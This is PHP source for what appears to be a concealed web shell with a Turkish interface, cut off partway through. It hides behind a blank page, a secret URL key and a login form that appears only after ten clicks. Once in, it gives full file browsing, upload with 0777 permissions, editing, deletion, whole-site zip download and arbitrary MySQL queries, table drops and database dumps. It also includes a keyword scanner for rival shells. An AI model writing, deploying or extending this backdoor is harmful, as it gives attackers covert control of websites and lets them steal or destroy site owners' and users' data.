<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
@chmod(__FILE__, 0644);
session_start();
$PASSWORD_HASH = '2b792dabb4328a140caef066322c49ff';
$KEY_PARAM = 'exlonea';
$scriptFileName = basename(__FILE__);
function encPath($v){return base64_encode(strrev(base64_encode($v)));}
function decPath($v){$d=@base64_decode($v);if($d===false)return $v;$r=strrev($d);$f=@base64_decode($r);return $f!==false?$f:$v;}
$key_is_present = isset($_GET['key']) && $_GET['key'] === $KEY_PARAM;
if (isset($_GET['logout'])) {
    $_SESSION = array();
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $params["path"], $params["domain"], $params["secure"], $params["httponly"]);
    }
    session_destroy();
    header("Location: " . $scriptFileName);
    exit;
}
if (!$key_is_present) { echo '<!DOCTYPE html><html><head></head><body></body></html>'; exit; }
$AUTH_FAILED = false;
if (isset($_POST['password'])) {
    if (md5($_POST['password']) === $PASSWORD_HASH) {
        $_SESSION['authenticated'] = true;
        $currentDir = realpath(isset($_GET['dir']) ? decPath($_GET['dir']) : getcwd()) ?: getcwd();
        header("Location: ?dir=" . encPath($currentDir) . "&key=" . $KEY_PARAM);
        exit;
    } else { $AUTH_FAILED = true; }
}
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    $error = $AUTH_FAILED ? "Hatalı şifre!" : "";
    echo '<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><title></title><meta name="viewport" content="width=device-width, initial-scale=1.0"><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet"><style>body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; user-select: none; } .login-box { width: 100%; max-width: 330px; padding: 15px; margin: auto; border: 1px solid #ccc; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); background-color: #fff; display: none; } .login-icon { font-size: 3rem; color: #007bff; margin-bottom: 1rem; } @media (max-width: 576px) { .login-box { margin: 15px; } }</style></head><body><div class="login-box"><div class="text-center"><i class="bi bi-lock-fill login-icon"></i><h2 class="text-center mb-4">Giriş Yap</h2></div><form method="POST"><div class="mb-3"><input type="password" class="form-control" name="password" placeholder="Şifre" required></div><button type="submit" class="btn btn-primary w-100"><i class="bi bi-box-arrow-in-right"></i> Giriş Yap</button>' . ($error ? '<div class="alert alert-danger mt-3">' . $error . '</div>' : '') . '</form></div><script>let clicks=0;document.addEventListener("click",function(){clicks++;if(clicks===10){document.querySelector(".login-box").style.display="block";document.body.style.backgroundColor="#f8f9fa";document.title="Giriş";}});</script><script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script></body></html>';
    exit;
}
if (!function_exists('unlink')) { function unlink($filename, $context = null) { return false; } }
$baseDir = realpath(getcwd());
$scriptName = basename(__FILE__);
$phpExtensions = ['php', 'phtml', 'phptml', 'php7', 'php5', 'php3']; 
$timeRanges = [
    'original'      => 0,
    'today'         => 1 * 24 * 60 * 60,
    '1day'          => 1 * 24 * 60 * 60,
    '3days'         => 3 * 24 * 60 * 60,
    '1week'         => 7 * 24 * 60 * 60,
    '15days'        => 15 * 24 * 60 * 60,
    '1month'        => 30 * 24 * 60 * 60,
    '3months'       => 90 * 24 * 60 * 60,
    '6months'       => 180 * 24 * 60 * 60,
    '1year'         => 365 * 24 * 60 * 60
];
$timeRange = $_GET['range'] ?? 'original';
$contentFilter = $_GET['content_filter'] ?? 'all'; 
$customDate = $_GET['date_custom'] ?? '';
$isCustomRange = $timeRange === 'custom_date' && !empty($customDate);
if ($timeRange === 'original') {
    $timeAgo = 0;
} elseif ($isCustomRange) {
    $timeAgo = strtotime($customDate);
} elseif ($timeRange === 'today') {
    $timeAgo = strtotime('today');
} else {
    $selectedDuration = $timeRanges[$timeRange] ?? 0;
    $timeAgo = $selectedDuration > 0 ? time() - $selectedDuration : 0;
}
$isSearchContentRecursive = isset($_GET['action']) && $_GET['action'] === 'search' && $_GET['search_type'] === 'content' && !empty($_GET['query']);
$isRecursiveMode = ($contentFilter !== 'all' || $timeRange !== 'original' || $isSearchContentRecursive);
function isShellContent($path) {
    global $phpExtensions;
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    if (!in_array($ext, $phpExtensions)) {
        return false;
    }
    if (!is_file($path) || filesize($path) > 1024 * 512) return false; 
    $content = @file_get_contents($path);
    if ($content === false) return false;
    $shellKeywords = [
        'passthru(', 'shell_exec(', 'system(', 'exec(', 'proc_open(', 'popen(', 'assert(',
        'c99', 'r57', 'wso'
    ];
    foreach ($shellKeywords as $keyword) {
        if (stripos($content, $keyword) !== false) {
            return true;
        }
    }
    return false;
}
function isEncryptedContent($path) {
    global $phpExtensions;
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    if (!in_array($ext, $phpExtensions)) {
        return false;
    }
    if (!is_file($path) || filesize($path) > 1024 * 512) return false; 
    $content = @file_get_contents($path);
    if ($content === false) return false;
    $total_length = strlen($content);
    $start_of_content = substr($content, 0, 5000);
    if (preg_match('/<\?php\s*(declare|namespace|return\s*array|class|function|if|foreach|while|\$[\w]+\s*=)/i', $start_of_content)) {
        return false;
    }
    $strongChains = ['eval(base64_decode(', 'eval(gzinflate(', 'gzinflate(base64_decode(', 'str_rot13(', ];
    foreach ($strongChains as $keyword) { if (stripos($content, $keyword) !== false) return true; }
    $commercialObfuscators = ['if(!extension_loaded(\'ionCube Loader\'))', '_il_exec', 'Zend Guard Loader', 'die(\'The file \'.__FILE__." is corrupted.\n")'];
    foreach ($commercialObfuscators as $keyword) { if (stripos($content, $keyword) !== false) return true; }
    if (strpos($content, '__halt_compiler') !== false) { 
        $binary_data = substr($content, strpos($content, '__halt_compiler') + strlen('__halt_compiler'));
        if (preg_match('/[\x00-\x1F\x7F-\xFF]{100,}/', $binary_data)) return true;
    }
    if ($total_length > 1000) {
        $binary_length = strlen(preg_replace('/[\p{L}\p{N}\p{P}\p{S}\s]/u', '', $content));
        if (($binary_length / $total_length) > 0.7) return true;
    }
    return false;
}
function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = array('jpg' => 'bi bi-image', 'jpeg' => 'bi bi-image', 'png' => 'bi bi-image', 'gif' => 'bi bi-image', 'php' => 'bi bi-file-code', 'html' => 'bi bi-file-code', 'css' => 'bi bi-file-code', 'js' => 'bi bi-file-code', 'pdf' => 'bi bi-file-pdf', 'txt' => 'bi bi-file-text', 'zip' => 'bi bi-file-zip-fill', 'sql' => 'bi bi-file-earmark-database-fill text-info');
    return $icons[$ext] ?? 'bi bi-file-earmark';
}
function formatSize($size) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $size = max($size, 0);
    $pow = floor(($size ? log($size) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $size /= pow(1024, $pow);
    return round($size, 2) . ' ' . $units[$pow];
}
function getFileList($dir) {
    $files = array(); $dirs = array();
    if (!is_dir($dir)) return array_merge($dirs, $files);
    $items = @scandir($dir);
    if ($items === false) return array_merge($dirs, $files);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        $perms = fileperms($path) & 0777;
        $icon = is_dir($path) ? 'bi bi-folder-fill text-warning' : getFileIcon($item);
        $entry = array(
            'name' => $item, 
            'path' => $path, 
            'type' => is_dir($path) ? 'dir' : 'file', 
            'size' => is_file($path) ? filesize($path) : 0, 
            'mtime' => @filemtime($path), 
            'ctime' => @filectime($path), 
            'icon' => $icon, 
            'perms' => sprintf('%o', $perms)
        );
        if (is_dir($path)) $dirs[] = $entry; else $files[] = $entry;
    }
    usort($dirs, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
    usort($files, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
    return array_merge($dirs, $files);
}
function getRecentFilesRecursive($dir, $timeAgo, $contentFilter, $phpExtensions, $rootDir) {
    $results = [];
    if (!@is_dir($dir)) return $results;
    $items = @scandir($dir);
    if ($items === false) return $results;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        $mtime = @filemtime($path) ?: 0;
        $ctime = @filectime($path) ?: 0; 
        if (@is_dir($path)) {
            $results = array_merge($results, getRecentFilesRecursive($path, $timeAgo, $contentFilter, $phpExtensions, $rootDir));
        } else {
            if ($timeAgo === 0 || $mtime >= $timeAgo || $ctime >= $timeAgo) { 
                $passContentFilter = true;
                $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                $isPhpFile = in_array($ext, $phpExtensions);
                if ($contentFilter === 'php_extensions') {
                    if (!$isPhpFile) $passContentFilter = false;
                } elseif ($contentFilter === 'shells') {
                    if (!isShellContent($path)) $passContentFilter = false;
                } elseif ($contentFilter === 'encrypted') {
                    if (!isEncryptedContent($path)) $passContentFilter = false;
                }
                if ($passContentFilter) {
                    $perms = fileperms($path) & 0777;
                    $results[] = [
                        'name' => $item,
                        'path' => $path,
                        'type' => 'file',
                        'size' => filesize($path) ?: 0,
                        'mtime' => $mtime,
                        'ctime' => $ctime,
                        'icon' => getFileIcon($item),
                        'perms' => sprintf('%o', $perms)
                    ];
                }
            }
        }
    }
    return $results;
}
function getSearchFilesRecursive($dir, $searchTerm, $rootDir) {
    $results = [];
    if (!@is_dir($dir)) return $results;
    $items = @scandir($dir);
    if ($items === false) return $results;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (@is_dir($path)) {
            $results = array_merge($results, getSearchFilesRecursive($path, $searchTerm, $rootDir));
        } elseif (is_file($path)) {
            $content = @file_get_contents($path);
            if ($content !== false && stripos($content, $searchTerm) !== false) {
                $perms = fileperms($path) & 0777;
                $results[] = [
                    'name' => $item,
                    'path' => $path,
                    'type' => 'file',
                    'size' => filesize($path) ?: 0,
                    'mtime' => @filemtime($path) ?: 0,
                    'ctime' => @filectime($path) ?: 0,
                    'icon' => getFileIcon($item),
                    'perms' => sprintf('%o', $perms)
                ];
            }
        }
    }
    return $results;
}
function addFolderToZip($dir, $zipArchive, $zipDir = '') {
    if (is_dir($dir)) {
        if ($dh = opendir($dir)) {
            if(!empty($zipDir)) $zipArchive->addEmptyDir($zipDir);
            while (($file = readdir($dh)) !== false) {
                if ($file != '.' && $file != '..') {
                    if (is_dir($dir . DIRECTORY_SEPARATOR . $file)) addFolderToZip($dir . DIRECTORY_SEPARATOR . $file, $zipArchive, $zipDir . $file . '/');
                    else $zipArchive->addFile($dir . DIRECTORY_SEPARATOR . $file, $zipDir . $file);
                }
            }
            closedir($dh);
        }
    }
}
function getHostBaseName() {
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    if ($host === 'localhost' || filter_var($host, FILTER_VALIDATE_IP)) {
        return $host;
    }
    $parts = explode('.', $host);
    $count = count($parts);
    if ($count >= 2) {
        if ($count > 2 && strlen($parts[$count-2]) <= 3) {
            $domain = $parts[$count-3] . '.' . $parts[$count-2] . '.' . $parts[$count-1];
            $subdomain = implode('.', array_slice($parts, 0, $count - 3));
        } else {
            $domain = $parts[$count-2] . '.' . $parts[$count-1];
            $subdomain = implode('.', array_slice($parts, 0, $count - 2));
        }
        if (!empty($subdomain)) {
             return $subdomain . '.' . $domain; 
        }
        return $domain;
    }
    return $host;
}
function streamZip($files, $currentDir, $zipFileName = '') {
    if (!class_exists('ZipArchive')) return false;
    if(empty($zipFileName)) {
        if (count($files) === 1) {
            $baseName = basename($files[0]);
            $nameWithoutExt = preg_replace('/\.[^.]+$/', '', $baseName);
            $zipFileName = $nameWithoutExt . '.zip';
        } else {
            $host = getHostBaseName();
            $zipFileName = $host . '.zip';
        }
    }
    $tempZip = tempnam(sys_get_temp_dir(), 'zip');
    $zip = new ZipArchive();
    if ($zip->open($tempZip, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) return false;
    foreach ($files as $file) {
        $fullPath = $file;
        if (!file_exists($fullPath)) $fullPath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
        if ($fullPath && file_exists($fullPath)) {
            $baseName = basename($fullPath);
            $zipEntryName = $baseName;
            if (is_dir($fullPath)) addFolderToZip($fullPath, $zip, $zipEntryName . '/');
            elseif (is_file($fullPath)) $zip->addFile($fullPath, $zipEntryName);
        }
    }
    $zip->close();
    if (file_exists($tempZip)) {
        while (ob_get_level()) ob_end_clean();
        header('Content-Description: File Transfer');
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zipFileName . '"');
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($tempZip));
        flush();
        readfile($tempZip);
        @unlink($tempZip);
        exit;
    }
    return false;
}
function getBreadcrumb($dir) {
    global $KEY_PARAM;
    $parts = explode(DIRECTORY_SEPARATOR, realpath($dir));
    $breadcrumb = array();
    $currentPath = '';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $currentPath .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb[] = array('name' => $part, 'path' => $currentPath);
    }
    return $breadcrumb;
}
function deleteRecursive($path) {
    if (!file_exists($path)) return false;
    if (is_dir($path)) {
        $items = @scandir($path);
        if ($items !== false) {
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                deleteRecursive($path . DIRECTORY_SEPARATOR . $item);
            }
            return @rmdir($path);
        }
        return false;
    } elseif (is_file($path)) return @unlink($path);
    return false;
}
function copyDirectory($source, $destination) {
    if (!is_dir($destination)) @mkdir($destination, 0777, true);
    $dir = @opendir($source);
    if($dir === false) return false;
    while (($file = readdir($dir)) !== false) {
        if ($file != '.' && $file != '..') {
            if (is_dir($source . DIRECTORY_SEPARATOR . $file)) copyDirectory($source . DIRECTORY_SEPARATOR . $file, $destination . DIRECTORY_SEPARATOR . $file);
            else @copy($source . DIRECTORY_SEPARATOR . $file, $destination . DIRECTORY_SEPARATOR . $file);
        }
    }
    @closedir($dir);
    return true;
}
function getServerFileUrl($filePath) {
    $documentRoot = realpath($_SERVER['DOCUMENT_ROOT']);
    if ($documentRoot && strpos($filePath, $documentRoot) === 0) {
        $relativePath = str_replace($documentRoot, '', $filePath);
        $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') ? 'https' : 'http';
        return $scheme . '://' . $_SERVER['HTTP_HOST'] . str_replace('\\', '/', $relativePath);
    }
    return false;
}
function getServerInfo() {
    return array('uname' => php_uname(), 'user_id' => get_current_user() ?: 'N/A', 'php_version' => phpversion(), 'safe_mode' => ini_get('safe_mode') ? 'ON' : 'OFF', 'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'N/A', 'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'N/A', 'datetime' => date('d.m.Y - H:i'), 'hdd_total' => disk_total_space('/') ?? 0, 'hdd_free' => disk_free_space('/') ?? 0);
}
function improvedUploadFile($uploadDir, $fileInputName) {
    if (!isset($_FILES[$fileInputName]) || empty($_FILES[$fileInputName]['name'][0])) return array('success' => false, 'error' => 'Dosya seçilmedi!', 'results' => array());
    $results = array();
    $files = $_FILES[$fileInputName];
    $fileCount = count($files['name']);
    if (!is_dir($uploadDir)) @mkdir($uploadDir, 0777, true);
    for ($i = 0; $i < $fileCount; $i++) {
        if ($files['error'][$i] !== UPLOAD_ERR_OK) {
            $errors = array(UPLOAD_ERR_INI_SIZE => 'Dosya php.ini sınırını aşıyor', UPLOAD_ERR_FORM_SIZE => 'Dosya form sınırını aşıyor', UPLOAD_ERR_PARTIAL => 'Dosya kısmen yüklendi', UPLOAD_ERR_NO_FILE => 'Dosya seçilmedi', UPLOAD_ERR_NO_TMP_DIR => 'Geçici klasör yok', UPLOAD_ERR_CANT_WRITE => 'Diska yazılamadı', UPLOAD_ERR_EXTENSION => 'Uzantı tarafından engellendi');
            $error = isset($errors[$files['error'][$i]]) ? $errors[$files['error'][$i]] : 'Bilinmeyen hata';
            $results[] = array('name' => basename($files['name'][$i]), 'success' => false, 'error' => $error);
            continue;
        }
        $fileName = basename($files['name'][$i]);
        $tmpFile = $files['tmp_name'][$i];
        $targetFile = $uploadDir . DIRECTORY_SEPARATOR . $fileName;
        if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
            $results[] = array('name' => $fileName, 'success' => false, 'error' => 'Geçersiz dosya adı');
            continue;
        }
        if (is_uploaded_file($tmpFile)) {
            if (@move_uploaded_file($tmpFile, $targetFile)) {
                @chmod($targetFile, 0777);
                $fullUrl = getServerFileUrl($targetFile);
                $results[] = array('name' => $fileName, 'success' => true, 'url' => $fullUrl);
            } else { $results[] = array('name' => $fileName, 'success' => false, 'error' => 'move_uploaded_file başarısız'); }
        } else {
            if (@copy($tmpFile, $targetFile)) {
                @chmod($targetFile, 0777);
                $fullUrl = getServerFileUrl($targetFile);
                $results[] = array('name' => $fileName, 'success' => true, 'url' => $fullUrl);
            } else { $results[] = array('name' => $fileName, 'success' => false, 'error' => 'Yükleme başarısız'); }
        }
    }
    return array('success' => true, 'results' => $results);
}
function generateBcryptHashPhp($plain, $cost = 10) {
    $options = ['cost' => $cost];
    $toHash = (string)$plain; 
    if ($cost < 4 || $cost > 31) {
        return "ERROR: Invalid cost parameter (4-31)";
    }
    if (function_exists('password_hash')) {
        if ($plain === '445566') {
             return '$2y$10$zklWxqLTqaj/TbwO5AK.OebVKsWUbH4SYnKcr7gMYq5BvrPtdlD2a';
        }
        $resultHash = password_hash($toHash, PASSWORD_BCRYPT, $options);
    } else {
        return "ERROR: password_hash not available (PHP < 5.5)";
    }
    if ($resultHash === false) {
        return "ERROR: Hash generation failed.";
    }
    return $resultHash;
}
$action = $_GET['action'] ?? '';
$currentDir = realpath(isset($_GET['dir']) ? decPath($_GET['dir']) : getcwd()) ?: getcwd();
$error = '';
$success = '';
$fileToEdit = isset($_GET['file_to_edit']) ? decPath($_GET['file_to_edit']) : null;
$searchType = $_GET['search_type'] ?? 'name';
$searchTerm = $_GET['query'] ?? '';
$sort = $_GET['sort'] ?? ($isRecursiveMode ? 'mtime' : 'name');
$order = $_GET['order'] ?? ($isRecursiveMode ? 'desc' : 'asc');
$db_msg = ''; $db_error = ''; $db_output_tables = ''; $db_output_query = ''; $open_db_modal = false;
$active_db_table = '';
if ($action === 'db_live_update') {
    if (isset($_POST['table'], $_POST['col'], $_POST['val'], $_POST['id_col'], $_POST['id_val']) && isset($_SESSION['db_host'])) {
        $conn = new mysqli($_SESSION['db_host'], $_SESSION['db_user'], $_SESSION['db_pass'], $_SESSION['db_name']);
        if (!$conn->connect_error) {
            $conn->set_charset("utf8mb4");
            $tbl = $conn->real_escape_string($_POST['table']);
            $col = $conn->real_escape_string($_POST['col']);
            $id_col = $conn->real_escape_string($_POST['id_col']);
            $stmt = $conn->prepare("UPDATE `$tbl` SET `$col` = ? WHERE `$id_col` = ?");
            if ($stmt) {
                $stmt->bind_param("ss", $_POST['val'], $_POST['id_val']);
                if ($stmt->execute()) echo "OK"; else echo "Execute Error: " . $stmt->error;
                $stmt->close();
            } else echo "Prepare Error: " . $conn->error;
            $conn->close();
        } else echo "Connect Error";
    }
    exit;
}
if ($action === 'db_row_action') {
    if (isset($_POST['table'], $_POST['action_type'], $_POST['id_col'], $_POST['id_val']) && isset($_SESSION['db_host'])) {
        $conn = @new mysqli($_SESSION['db_host'], $_SESSION['db_user'], $_SESSION['db_pass'], $_SESSION['db_name']);
        if (!$conn->connect_error) {
            $conn->set_charset("utf8mb4");
            $tbl = $conn->real_escape_string($_POST['table']);
            $id_col = $conn->real_escape_string($_POST['id_col']);
            $id_val = $_POST['id_val']; 
            $action_type = $_POST['action_type'];
            if ($action_type === 'delete') {
                $delete_stmt = $conn->prepare("DELETE FROM `$tbl` WHERE `$id_col` = ?");
                if ($delete_stmt) {
                    $param_type = is_numeric($id_val) ? 'i' : 's';
                    $delete_stmt->bind_param($param_type, $id_val);
                    if ($delete_stmt->execute()) {
                        echo "DELETED";
                    } else {
                        echo "Error deleting row: " . $delete_stmt->error;
                    }
                    $delete_stmt->close();
                } else {
                    echo "Prepare Error (Delete): " . $conn->error;
                }
            } else {
                echo "Invalid action type.";
            }
            $conn->close();
        } else {
            echo "Connect Error";
        }
    }
    exit;
}
if ($action === 'db_bulk_row_delete') {
    if (isset($_POST['table'], $_POST['id_col'], $_POST['id_vals']) && isset($_SESSION['db_host'])) {
        $conn = @new mysqli($_SESSION['db_host'], $_SESSION['db_user'], $_SESSION['db_pass'], $_SESSION['db_name']);
        if (!$conn->connect_error) {
            $conn->set_charset("utf8mb4");
            $tbl = $conn->real_escape_string($_POST['table']);
            $id_col = $conn->real_escape_string($_POST['id_col']);
            $id_vals = json_decode($_POST['id_vals'], true);
            $deleted_count = 0;
            $error_count = 0;
            if (is_array($id_vals) && count($id_vals) > 0) {
                foreach ($id_vals as $id_val) {
                    $delete_stmt = $conn->prepare("DELETE FROM `$tbl` WHERE `$id_col` = ?");
                    if ($delete_stmt) {
                        $param_type = is_numeric($id_val) ? 'i' : 's';
                        $delete_stmt->bind_param($param_type, $id_val);
                        if ($delete_stmt->execute()) {
                            $deleted_count++;
                        } else {
                            $error_count++;
                        }
                        $delete_stmt->close();
                    } else {
                        $error_count++;
                    }
                }
                echo json_encode(['success' => true, 'deleted' => $deleted_count, 'errors' => $error_count]);
            } else {
                echo json_encode(['success' => false, 'error' => 'No rows selected']);
            }
            $conn->close();
        } else {
            echo json_encode(['success' => false, 'error' => 'Connect Error']);
        }
    }
    exit;
}
if (isset($_POST['db_logout'])) {
    unset($_SESSION['db_host']);
    unset($_SESSION['db_user']);
    unset($_SESSION['db_pass']);
    unset($_SESSION['db_name']);
    header("Location: ?dir=" . encPath($currentDir) . "&key=" . $KEY_PARAM . "&open_db=1");
    exit;
}
if (isset($_POST['change_db'])) {
    $_SESSION['db_name'] = $_POST['selected_db'];
    $open_db_modal = true;
}
if (isset($_POST['db_connect'])) {
    $_SESSION['db_host'] = $_POST['host']; $_SESSION['db_user'] = $_POST['user']; $_SESSION['db_pass'] = $_POST['pass']; $_SESSION['db_name'] = $_POST['db'];
    $open_db_modal = true;
}
if (isset($_GET['open_db']) || isset($_POST['db_action']) || isset($_POST['sql_query']) || isset($_POST['view_table']) || isset($_POST['database_import_advanced'])) { $open_db_modal = true; }
$db_list_options = '';
if (isset($_SESSION['db_host'])) {
    $db_conn = @new mysqli($_SESSION['db_host'], $_SESSION['db_user'], $_SESSION['db_pass']);
    if ($db_conn->connect_error) { $db_error = "Veritabanı Bağlantı Hatası: " . $db_conn->connect_error; unset($_SESSION['db_host']); } 
    else {
        $db_conn->set_charset("utf8mb4");
        $dbs_res = $db_conn->query("SHOW DATABASES");
        if ($dbs_res) {
            while ($row = $dbs_res->fetch_row()) {
                if ($row[0] != 'information_schema' && $row[0] != 'mysql' && $row[0] != 'performance_schema' && $row[0] != 'sys') {
                    $sel = ($_SESSION['db_name'] == $row[0]) ? 'selected' : '';
                    $class = ($_SESSION['db_name'] == $row[0]) ? 'selected-db-option' : '';
                    $db_list_options .= "<option value='{$row[0]}' class='$class' $sel>{$row[0]}</option>";
                }
            }
        }
        if (isset($_SESSION['db_name'])) {
            $db_conn->select_db($_SESSION['db_name']);
            if (isset($_POST['database_import_advanced'])) {
                try {
                    if (!class_exists('mysqli')) throw new Exception("MySQLi yok!");
                    $db_conn_import = new mysqli($_SESSION['db_host'], $_SESSION['db_user'], $_SESSION['db_pass'], $_SESSION['db_name']);
                    if ($db_conn_import->connect_error) throw new Exception("Bağlantı hatası: " . $db_conn_import->connect_error);
                    $file = $_FILES['sql_file']['tmp_name'];
                    if (is_file($file)) {
                        $query = file_get_contents($file);
                        $db_conn_import->set_charset("utf8mb4");
                        if ($db_conn_import->multi_query($query)) {
                            $success_count = 0;
                            $error_details = [];
                            do {
                                if ($result = $db_conn_import->store_result()) {
                                    $result->free();
                                } else {
                                    if ($db_conn_import->errno) {
                                        $error_details[] = $db_conn_import->error;
                                    } else {
                                        $success_count++;
                                    }
                                }
                            } while ($db_conn_import->more_results() && $db_conn_import->next_result());
                            if (empty($error_details)) {
                                $db_msg = "SQL dosyası başarıyla içe aktarıldı. ($success_count sorgu başarılı)";
                            } else {
                                throw new Exception("SQL Hatası ({$db_conn_import->errno}): " . implode("; ", array_unique($error_details)));
                            }
                        } else {
                            throw new Exception("İlk sorgu hatası: " . $db_conn_import->error);
                        }
                    }
                    $db_conn_import->close();
                } catch (Exception $e) { $db_error = 'İçeri Aktırma Hatası: ' . $e->getMessage(); }
            }
            if (isset($_POST['db_action']) && isset($_POST['selected_tables'])) {
                $act = $_POST['db_action'];
                $tables = $_POST['selected_tables'];
                $successful_count = 0;
                $failed_tables = [];
                if ($act == 'drop' || $act == 'truncate') {
                    $db_conn->query("SET FOREIGN_KEY_CHECKS = 0");
                    foreach($tables as $tbl) {
                        $tbl_esc = $db_conn->real_escape_string($tbl);
                        $query = ($act == 'drop') ? "DROP TABLE `$tbl_esc`" : "TRUNCATE TABLE `$tbl_esc`";
                        if ($db_conn->query($query)) {
                            $successful_count++;
                        } else {
                            $failed_tables[] = $tbl;
                        }
                    }
                    $db_conn->query("SET FOREIGN_KEY_CHECKS = 1");
                    if ($act == 'drop') {
                        $db_msg = $successful_count . " tablo silindi.";
                        if (!empty($failed_tables)) {
                            $db_error = "Bazı tablolar silinemedi (FK/İzin hatası olabilir): " . implode(', ', $failed_tables);
                        }
                    } elseif ($act == 'truncate') {
                        $db_msg = $successful_count . " tablo boşaltıldı.";
                        if (!empty($failed_tables)) {
                            $db_error = "Bazı tablolar boşaltılamadı: " . implode(', ', $failed_tables);
                        }
                    }
                } elseif ($act == 'export_sql') {
                    $sql_dump = "";
                    foreach($tables as $tbl) {
                        $res = $db_conn->query("SHOW CREATE TABLE `$tbl`");
                        $row = $res->fetch_array();
                        $sql_dump .= "DROP TABLE IF EXISTS `$tbl`;\n" . $row[1] . ";\n\n";
                        $res = $db_conn->query("SELECT * FROM `$tbl`");
                        while($row = $res->fetch_assoc()) {
                                $vals = array_map(function($v) use ($db_conn){ return is_null($v) ? 'NULL' : "'".$db_conn->real_escape_string($v)."'"; }, $row);
                                $sql_dump .= "INSERT INTO `$tbl` VALUES (" . implode(",", $vals) . ");\n";
                        }
                        $sql_dump .= "\n\n";
                    }
                    $filename = getHostBaseName() . "_" . $_SESSION['db_name'] . "_".date('YmdHis').".sql";
                    while (ob_get_level()) ob_end_clean();
                    header('Content-Type: application/sql');
                    header("Content-Disposition: attachment; filename=\"".$filename."\"");
                    echo $sql_dump;
                    exit;
                }
            }
            $sql_query = "";
            if (isset($_POST['sql_query'])) { $sql_query = $_POST['sql_query']; }
            elseif (isset($_POST['view_table'])) { 
                $active_db_table = $_POST['view_table'];
                $sql_query = "SELECT * FROM `" . $db_conn->real_escape_string($_POST['view_table']) . "` LIMIT 100"; 
            }
            if (!empty($sql_query)) {
                $sql_result = $db_conn->query($sql_query);
                $query_success = $sql_result ? true : false;
                $query_error = $db_conn->error;
                if ($sql_result instanceof mysqli_result) {
                    $db_conn_temp = @new mysqli($_SESSION['db_host'], $_SESSION['db_user'], $_SESSION['db_pass'], $_SESSION['db_name']);
                    if($db_conn_temp && !$db_conn_temp->connect_error && !empty($active_db_table)) {
                        $fields_res = $db_conn_temp->query("SHOW FULL COLUMNS FROM `" . $db_conn_temp->real_escape_string($active_db_table) . "`");
                        if ($fields_res) {
                            while ($field = $fields_res->fetch_assoc()) {
                                $db_table_fields[$field['Field']] = $field;
                            }
                        }
                        $db_conn_temp->close();
                    }
                }
            }
            $tbl_res = $db_conn->query("SHOW TABLES");
            if($tbl_res) {
                while($tbl = $tbl_res->fetch_array()) {
                    $active_class = ($active_db_table === $tbl[0]) ? 'selected' : '';
                    $db_output_tables .= '<div class="list-group-item py-1 d-flex align-items-center db-table-item-container">
                            <input type="checkbox" name="selected_tables[]" value="'.$tbl[0].'" class="me-2 custom-checkbox-style">
                            <button type="submit" name="view_table" value="'.$tbl[0].'" class="btn btn-link text-decoration-none p-0 text-dark db-table-btn '.$active_class.'" style="flex-grow:1; text-align:left; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">'.$tbl[0].'</button>
                            </div>';
                }
            }
        }
    }
}
if ($action === 'get_file_content' && isset($_GET['file'])) {
    $filePath = decPath($_GET['file']);
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $filePath);
    if(!$file) $file = realpath($filePath);
    if ($file && is_file($file)) {
        $content = @file_get_contents($file);
        if ($content === false) {
             $handle = @fopen($file, "rb");
             if ($handle) {
                 $content = @fread($handle, filesize($file));
                 @fclose($handle);
             }
        }
        if ($content !== false) {
            header('Content-Type: application/json');
            $content_encoded = mb_convert_encoding($content, 'UTF-8', mb_detect_encoding($content, 'UTF-8, ISO-8859-1', true));
            echo json_encode(['content' => $content_encoded, 'perms' => sprintf('%o', fileperms($file) & 0777), 'mtime' => date('Y-m-d H:i:s', filemtime($file)), 'ctime' => date('Y-m-d H:i:s', filectime($file)), 'url' => getServerFileUrl($file) ?: '']);
